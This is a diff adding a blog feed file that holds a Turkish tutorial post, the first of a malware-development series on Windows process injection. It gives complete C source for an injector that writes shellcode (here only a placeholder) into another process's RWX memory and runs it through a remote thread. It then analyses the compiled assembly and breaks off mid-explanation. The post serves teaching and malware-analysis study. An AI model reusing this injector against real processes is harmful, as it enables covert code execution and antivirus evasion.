@@ -1,0 +1,782 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-30T19:27:54+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">bekoo’s blog</title><subtitle>&quot;Everything open-source if you can read Assembly.&quot;
+</subtitle><author><name>bekoo</name></author><entry><title type="html">MD 0x0 | Process Injection</title><link href="http://localhost:4000/2023/08/08/MD-0x0-=_-Process-Injection.html" rel="alternate" type="text/html" title="MD 0x0 | Process Injection" /><published>2023-08-08T00:00:00+03:00</published><updated>2023-08-08T00:00:00+03:00</updated><id>http://localhost:4000/2023/08/08/MD%200x0%20=_%20Process%20Injection</id><content type="html" xml:base="http://localhost:4000/2023/08/08/MD-0x0-=_-Process-Injection.html"><![CDATA[<style>
+    h4 {
+        /* in this blogs use h4 tags is description for images. */
+        text-align: center;
+        font-size: 14px;
+        margin-bottom: 2%;
+    }
+
+    img {
+        margin-top: 2%;
+    }
+</style>
+
+<h2 id="introduction">Introduction</h2>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZNG1aJP-tlASpm6q8mdWBQ.png" /></p>
+
+<p>Merhabalar. Yeni başladığım Malware Development serisinin ilk bölümüne hoşgeldiniz. Bu serinin ilk konusu olarak Process Injection konusuna değineceğim.</p>
+
+<p>Bu seride amaçladığım şey de sizlere basit bir Process Injection senaryosu göstermekle beraber, bu tür basit malware’ları nasıl Assembly kodları ile analiz yapabileceğinizi basit bir şekilde anlatmaya çalışacağım. Yani bu seride okuyucunun beyni yakılması amaçlanmıştır.</p>
+
+<h2 id="sorumluluk-reddi">Sorumluluk Reddi</h2>
+
+<p>Sorumluluk reddi alarak; bu seri tamamen eğitim amaçlıdır yani farklı bir deyişle This is for educational purposes only. Bu seride anlatım için tamamen sanal makineler kullanılacaktır yani güvenli ortamlar üzerinde testler yapılacaktır. Dolayasıyla uygulayacılara da aynısını yapmasını öneriyorum. Gerçekleştireceğiniz gerçek senaryoların sorumluluğu sizlere aittir.</p>
+
+<h2 id="gereksinimler">Gereksinimler</h2>
+
+<p>MD serisi için sizlerden istediğim temel seviyede C bilgisi ve en azından okuyabileceğiniz kadar Assembly bilginiz olması.</p>
+
+<h2 id="0x0--nedir-bu-processler">0x0 — Nedir Bu Processler?</h2>
+
+<p>Yok öyle beleşten hemen process Injection’u anlayım falan. Buraya geldiyseniz o beyinler yanacak.</p>
+
+<p>Kabaca Processler, işletim sistemi tarafından herhangi bir programın yürütülmesi için oluşturulan çalışma birimleridir. Eğer bir program, kullanıcı veya İşletim Sistemi (OS) tarafından çalıştırılmak istenirse, öncelikle İşletim Sistemi tarafından belleğe yüklenir ardından yine İşletim Sistemi tarafından bu programın yürütülmesi için bir process oluşturulur. En sonda ise belleğe yüklenen programın bellek alanı, Process tarafından temsil edilir ve programın içerdiği komutları çalıştırılmaya başlanır.</p>
+
+<p>Arayüz ortamında gördüğünüz herhangi bir programın dosyaları (kabaca program kodları), kullanıcı veya işletim sistemi tarafından çalıştırılmadığı sürece pasif halde olur. Eğer hedef program çalıştırılmak istenirse, önce diskten belleğe aktarılır ardından aktarılan bu kodlar yürütülmeye başlanır. Bu esnada ise program aktif hale gelmiş olur.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*sUbHOymvfHoH_uGqGXcPeQ.png" /></p>
+<h4> Linux ortamında htop aracığıyla görüntülenen bir process listesi </h4>
+
+<h2 id="0x1--threadler">0x1 — Thread’ler</h2>
+
+<blockquote>
+  <p>Bir Process, en basit ifadeyle, yürütülmekte olan bir programdır. Process bağlamında bir veya daha fazla thread çalışır. Thread ise işletim sisteminin işlemci zamanını tahsis ettiği temel birimdir. Bir Thread, başka bir thread tarafından yürütülmekte olan kısımlar da dahil olmak üzere, işlem kodunun herhangi bir bölümünü yürütebilir. 
+— <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"> Microsoft Learn - Process and Threads </a></p>
+</blockquote>
+
+<p>Process’lere göre daha hızlı ve hafif olan Thread’ler, kabaca tanımıyla İşletim Sisteminde bağımsız olarak çalışan birimlerdir. Herhangi bir process içerisinde bir veya daha fazla thread olabilir. Dolayasıyla Process’ler, Thread’ler sayesinde birden fazla işi aynı anda yapabilir.</p>
+
+<p>Thread aracılığıyla Process’lerin birden fazla işi aynı anda yapılabileceğinden bahsettim. Bunu biraz daha detaylandıralım. Örneğin bir web tarayacısı düşünün. Bu web tarayıcısının bir thread ile kullanıcının arayüzle etkileşimi yönetilirken diğer thread’ler ile arka planda web sayfaları yüklemek gibi işlemleri aynı anda gerçekleştirebilir.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*RVtaQpjRT3f5XXv_5dU5ig.png" /></p>
+<h4> Task Manager aracılığıyla görüntülenen Firefox Process’in Thread’leri (17 tane) </h4>
+
+<h2 id="0x2--windowsh-kütüphanesi-ve-bazı-apilar">0x2 — Windows.h Kütüphanesi ve Bazı API’lar</h2>
+
+<p>Bu eğitim serisinde sıklıkla kullanacağımız windows.h kütüphanesini ve Process Injection senaryosunda kullanacağımız gerekli API’ları tanıyalım. Bu kısım biraz sıkıcı olduğu için burayı geçebilirsiniz veya dilerseniz kodları incelediğinizde burayı kullanabilirsiniz.</p>
+
+<p>windows.h kütüphanesi, C ve C++ dilleri için Windows API’larını içeren bir başlık dosyasıdır. Windows API’ları, Microsoft Windows işletim sisteminin çeşitli işlevlerine erişim sağlayan programlama arabirimleridir.</p>
+
+<p>Tabi ki bu kütüphane içerisinde birçok API barınmaktadır. Dolayasıyla burada hepsini bahsetmem mümkün değil. Dolayasıyla bu 0x0 part’ında kullanacağımız API’lardan bahsedeceğim sadece.</p>
+
+<h3 id="openprocess">OpenProcess()</h3>
+
+<p>OpenProcess(), İşletim Sistemi içerisinde çalışan herhangi bir Process’i açmamızı sağlayan bir API’dir. Bu API’yi kullanarak açtığımız Process’in HANDLE’ını elde edebiliriz.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">OpenProcess</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span> <span class="n">dwDesiredAccess</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">BOOL</span>  <span class="n">bInheritHandle</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span> <span class="n">dwProcessId</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="virtualallocex">VirtualAllocEx()</h3>
+
+<p>VirtualAllocEx(), İşletim Sistemi içerisinde çalışan herhangi bir Process’in belleğinde yer ayırmamızı sağlayan bir API’dır.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="writeprocessmemory">WriteProcessMemory()</h3>
+
+<p>Belirlenen Process’in bellek alanına veri yazmak için kullandığımız bir API’dır. Ancak veri yazılacak alana tamamen erişiminiz olması lazım aksi takdirde veri yazma işlemi başarısız olur.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="createremotethreadex">CreateRemoteThreadEx()</h3>
+
+<p>Başka bir Process’in sanal alanında bir thread oluşturmamızı sağlayan ve çalıştırmamızı sağlayan bit API’dır.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateRemoteThreadEx</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">HANDLE</span>                       <span class="n">hProcess</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>        <span class="n">lpThreadAttributes</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">SIZE_T</span>                       <span class="n">dwStackSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">LPTHREAD_START_ROUTINE</span>       <span class="n">lpStartAddress</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPVOID</span>                       <span class="n">lpParameter</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">DWORD</span>                        <span class="n">dwCreationFlags</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPPROC_THREAD_ATTRIBUTE_LIST</span> <span class="n">lpAttributeList</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPDWORD</span>                      <span class="n">lpThreadId</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="waitforsingleobject">WaitForSingleObject()</h3>
+
+<p>Belirtilen nesne sinyali (kabaca hareketi) durumu gerçekleşene kadar programı bekleten bir API’dır. Bu API’yi, Thread’ın durumunu izlemek için kullanacağız.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>  <span class="n">dwMilliseconds</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h2> 0x3 — Process Injection Attack </h2>
+
+<p>Yepp, temel şeyleri anladık şimdi saldırının nasıl gerçekleştirildiğini daha kolay anlayabileceğiz.</p>
+
+<p>Process Injection saldırısı, bir saldırganın, çalışan herhangi bir Process’e kendi zararlı kodunu enjekte ederek sisteme saldırmayı hedefleyen bir saldırı türüdür. Bu saldırı, çoğunlukla antivirüs programlarına yakalanmamak için kullanılır ve birden fazla teknikleri bulunmaktadır. Tekniklerden bir kaçını aşağıda sırayalım:</p>
+
+<ul>
+  <li>Process Doppelgänging</li>
+  <li>Process Hollowing</li>
+  <li>DLL Injection</li>
+  <li>AtomBombing</li>
+  <li>Thread Execution Hijacking</li>
+</ul>
+
+<p>Bu saldırı tekniklerinin açıklamarına bu konuda yer vermeyeceğim. İlerideki serilerimde bunları tek tek detaylandıracağım.</p>
+
+<p>Yukarıda bahsettiğim gibi, çalışacak programlar için bellekte yer ayrıldığını ve İşletim Sistemi tarafından oluşturulan Process’in bu belleği temsil ettiğini söylemiştim. İşte bu saldırıda ise hedef Process’in belleğine erişim sağlayıp ardından bu bellek içerisinde bir yer ayırıp içerisine zararlı kodu enjekte edilir. Bu part’ta ilerleyeceğimiz senaryoda ise en sonda bir Thread oluşturup bu zararlı kodu çalıştırmasını sağlayacağız.</p>
+
+<h2> 0x4 — Process Injection için Senaryo </h2>
+
+<p>Evet asıl konumuza geldik yani kuru fasulyenin faydalarına….</p>
+
+<p>Bu örnek senaryo da iki tane sanal makine kullanacağım. Biri, hedef sistem olarak windows x64 işletim sistemi ve saldırgan sistem olarak kali x64 sistemi kullanacağım.</p>
+
+<p>Senaryo için C ile Process Injection için bir kod parçası yazacağız ardından senaryodan önce malware’in assembly karşılığını kontrol edeceğiz ve en sonunda ise sonucu göreceğiz.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span>
+<span class="cm">/* Messages */</span>
+<span class="kt">char</span> <span class="n">e</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"[-]"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">s</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"[+]"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">i</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"[*]"</span><span class="p">;</span>
+
+<span class="cm">/* Shellcode */</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bekoShell</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41</span><span class="s">"</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* Eğer Program, parametre verilmeden çalıştırılırsa, Programı hata mesajına yönlendiriyoruz ardından programı bitiriyoruz. */</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s Usage: .</span><span class="se">\\</span><span class="s">injector.exe &lt;PID&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">DWORD</span> <span class="n">PID</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    
+    <span class="cm">/* Kullanıcıdan Alınan Process ID'i kullanarak hedef process'i tam yetki ile açıyoruz. */</span>
+    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">PID</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* Eğer OpenProcess fonksiyonun geri dönüş adresi NULL olursa hata mesajına yönlendiriyoruz. */</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s Failed to open the process! Error Code: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Target Process is Open! PID: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">PID</span><span class="p">);</span>
+
+    <span class="cm">/* Hedef Process'in bellek alanında shellcode için yer ayırıyoruz. */</span>
+    <span class="n">LPVOID</span> <span class="n">remoteBuffer</span><span class="p">;</span>
+    <span class="n">remoteBuffer</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bekoShell</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">remoteBuffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* Eğer VirtualAllocEx işlemin geri dönüş adresi NULL dönerse programı hata mesajına yönlendiriyoruz. */</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s Failed to Allocate at %p Memory Address! Error Code: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">remoteBuffer</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Allocated %zu-bytes to %p Address!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bekoShell</span><span class="p">),</span> <span class="n">remoteBuffer</span><span class="p">);</span>
+
+    <span class="cm">/* Bellek alanında yer ayırdığımız alana shellcode'u yerleştiriyoruz. */</span>
+    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteBuffer</span><span class="p">,</span> <span class="n">bekoShell</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bekoShell</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Shellcode was written on the Target Process!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+
+    <span class="cm">/* Yerleştirdiğimiz Shellcode'u çalıştırmak için uzaktan çalıştırılabilen bir RemoteThread oluşturuyoruz. */</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThreadEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">remoteBuffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s Failed to Create Thread! Error Code: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Created Remote Thread!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Waiting for the shellcode to be executed....</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+
+    <span class="cm">/* Oluşturulan Thread'in uzaktan komutu çalıştırılması için Programı beklemeye alıyoruz. */</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s Yeaap! Shellcode is executed! Good Bye :&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Basit kod parçası budur. Senaryomuza geçmeden önce kodların Assembly kısmına bakarak programın ne yaptığını bir anlamakla başlayacağız. “Neden C kodlarıyla değil de Assembly kodları ile anlatıyorsun?” diyenleriniz olacaktır. Bu seride amaçladığım şeyden biri de bu tür malware’ları nasıl analiz edebileceğinizdir. Dolayasıyla gerçek bir analizde elinizde source code olmayacağı için programı Assembly kodlarına bakmanız gerekecektir.</p>
+
+<p>Eğer hayattan soğumaya hazırsanız hadi başlayalım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*AcF38FmKQvUP1EPoGLsNug.png" /></p>
+<h4> main Location </h4>
+
+<p>Programın başlangıcına baktığımızda, “function prologue” adı verilen işlemlerin gerçekleştiğini görüyoruz. Bundan sonra da, kullanıcı programı başlatılırken kullandığı parametre sayısı rbp+arg_0 adresine aktarılıyor. rbp+arg_8 adresine ise kullanıcıdan aldığımız PID değeri aktarılıyor. Bu kısımda biraz kafanız karışmış olabilir biraz detaylandırayım.</p>
+
+<p>Örnek olarak malware’i şu şekilde başlattığınızı varsayalım:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./injector 670
+</code></pre></div></div>
+
+<p>Buradaki .\injector.exe ve 670 bir parametredir. Parametre sayımları 0,1 diye gider. Yani .\injector.exe 0. parametreyi temsil ederken kullanıcının PID olarak verdiği 670 parametresi ise 1. parametre olarak temsil edilir. Devamında ise 2,3,4… diye gider. Programlama Dillerindeki Array dizilimi gibi düşünün.</p>
+
+<p>Ancak önemli bir nokta ise bu alınan parametreler her zaman string olarak ele alınır. Evet, biz malware’da 670 gibi bir integer değerler giriyoruz ancak her ne kadar da biz Integer bir değer girsek de arka planda bu string olarak ele alınıyor. Dolayasıyla C kodlarına bakarsanız atoi fonksiyonuyla alınan PID değerin Integer’a çevrildiğini göreceksiniz.</p>
+
+<p>Daha sonra cmp ile rbp+arg_0 adresindeki değerin kontrol edildiğini görüyoruz. Hatırlayın, bu adresde, kullanıcının verdiği parametre sayısı tutulmakta. Kontrolde, eğer bu adresdeki değer 1’den büyükse (jg kullanılmış yani Jump Greater anlamına gelir) program loc_1400015CE konumuna yönlendiriliyor. Burası da bizim programın devam edeceği kısım. Eğer 0’dan küçük ise hata mesajına yönlendirilerek program bitiriliyor.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*87EEDg8H7HMenQADtARKnA.png" /></p>
+<h4> loc_1400015CE Location </h4>
+
+<p>Bu kısımdaki ilk kodlarımıza baktığımızda başta rax register’ına rbp+arg_8 adresindeki değer aktarılıyor. Burada, kullanıcının parametre olarak girdiği Hedef Process’in ID’si bulunmaktadır. rax’a aktarılma nedeni de, alınan PID, integer’a çevrilmek için atoi fonksiyonuna verilecek olmasıdır. Daha sonra rax registeri 8 byte arttırılıyor ve ardından rax’ın 8 byte arttırılmış değeri adres olarak tekrar rax’a aktarılıyor. Daha sonra ise rcx’e rax register içerisindeki değerin son hali aktarılıyor ve program atoi fonksiyonuna gidiyor. Yani bu kısımda kabaca parametrenin Integer’a çevrildiğini anlayabilirsiniz.</p>
+
+<p>Daha sonraki işlemlerine baktığımızda OpenProcess’in fonksiyon olarak çağrıldığını görüyoruz dolayasıyla ondan önceki işlemlerinde parametre hazırlığı olduğunu anlayabiliriz.</p>
+
+<p>rbp+dwProcessId adresine eax’ın değeri aktarılıyor. Burada parametre olarak verilen PID değerin Integer hali saklanmaktadır. Daha sonra r8d register’a OpenProcess’in bir parametresi olarak eax’ın değeri aktarılıyor. Ondan sonra edx’e ise 0 değeri aktarıldığını görüyoruz. Buradaki 0, muhtemelen ya OpenProcess’e 2. parametre olarak parametre olarak FALSE veya NULL değeri verilmesinden kaynaklıdır.</p>
+
+<p>Daha sonra ecx’e baktığımızda 1FFFFFh değeri aktarıldığını görüyoruz. 1FFFFFhdeğeri, Windows işlem yönetimi işlevlerinde kullanılan PROCESS_ALL_ACCESS sabitine karşılık gelir. Bu değer, process’e tam erişim hakkını temsil eder. Bu, bütün 32 bitin 1 olduğu bir değeri ifade eder: 0001 1111 1111 1111 1111 1111 1111 1111 (binary). Bu haklar, işlemi başlatma, durdurma, bellek alanlarına erişim ve diğer çeşitli işlem yönetimi görevlerini gerçekleştirmeyi sağlar.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Uiad7LVb-hf4PDuL3lhhag.png" /></p>
+<h4> loc_1400015CE Location </h4>
+
+<p>Daire içerisindeki işlemlere baktığımızda OpenProcess’in adresi rax’a aktarılmaktadır. Daha sonra bu aktarılan adres ile Program oraya yönlendiriliyor.</p>
+
+<p>Program tekrar loc_1400015CE adresine döndüğünde rbp+hProcess adresine rax’ın değeri aktarılıyor. Burada aktarılan değer, OpenProcess’in geri dönüş adresi bulunmaktadır. En sonda ise cmp ile bu Adres içerisindeki değer kontrol ediliyor. Eğer 0 (yani NULL) eşit değilse program (jnz kullanılmış yani Jump not Zero) loc_14000163F konumuna yönlendiriliyor.</p>
+
+<p>Yani bu şuana kadar ki işlemlerin sonucunda kullanıcıdan alınan Process ID ile ve Tüm yetkilerle Process’in açıldığını görmekteyiz.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*98z0zY0atH1dL3YOc8biQg.png" /></p>
+<h4> loc_14000163F Location </h4>
+
+<p>Bu konuma baktığımızda, öncelikle Integer’a çevrilmiş PID verisi eax’a aktarıldığını görüyoruz. Bunun sebebini anlamak için ilerideki kodlarda çağırılan printf fonksiyonundan anlayabiliriz. “Target Process is Open! PID: %s” mesajı ekrana bastırılırken kullanıcının girdiği PID değeriyle ekrana bastırılıyor.</p>
+
+<p>İlerideki kodlara baktığımızda VirtualAllocEx fonksiyonun çağrıldığını görmekteyiz. Yani açılan process içerisinde bir bellek ayrımı yapılacağını anlayabiliriz. Şimdi kodları buna göre inceleyelim.</p>
+
+<p>İlk başta VirtualAllocEx’in flProtect parametresi olarak rsp+60h+flProtect adresine 40h değer ekleniyor. Bu 40h, PAGE_EXECUTE_READWRITE değerine eş gelmektedir:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*vHgLrNxTxN769_I50TJwsQ.png" /></p>
+<h4> Kaynakça için <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">buraya</a> tıklayabilirsiniz. </h4>
+
+<p>Aklınızda bulunsun, bir malware’i analiz ederken böyle farklı değerlere denk gelirseniz kesinlikle microsoft gibi dökümanlardan yararlanın.</p>
+
+<p>Buna göre, bu malware’in hedef process içerisinde oluşturduğu sanal bellek içerisindeki kodda 3 yetkiye (Okuma, Yazma ve Çalıştırma) sahip olduğunu anlayabiliyoruz.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*xnHX07MrBjvGzNzNnmxUNQ.png" /></p>
+<h4> VirtualAllocEx Parametreleri </h4>
+
+<p>Kaldığımız yerden devam edelim.</p>
+
+<p>r9d register’a 3000h değeri atandığını görmekteyiz. Bu, VirtualAllocEx’de flAllocationType parametresi içindir. Bu parametre, bellekte yer ayırmak istediğimiz türü belirleriz. “Peki 3000h neye denk geliyor?” diye sorabilirsiniz. Hemen Microsoft’un dökümanından bir kaçına bakalım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*RHCc4IDonEjfezIZQIMpQw.png" /></p>
+<h4> Dökümana ulaşmak için <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">buraya</a> tıklayabilirsiniz. </h4>
+
+<p><strong>“Eee! Burada 0x00003000 yok!”</strong> diyenleriniz olacak. Hemen açıklayım.</p>
+
+<p>Yukarıda C kodunda, biz bellek ayrım türü için 2 tane bayrak kullandık (MEM_COMMIT ve MEM_RESERVE) ve bu bayrakların binary karşılıklarının bitwise or sonucunun hex karşılığını görmekteyiz yani 3000h. Ancak bu kodu bilmediğimizi düşünerek hareket edersek, bu bayrakların olduğunu nasıl anlayabiliriz bundan bahsedeceğim. Kafanız karışmış olabilir ama şimdi detaylandıracağım.</p>
+
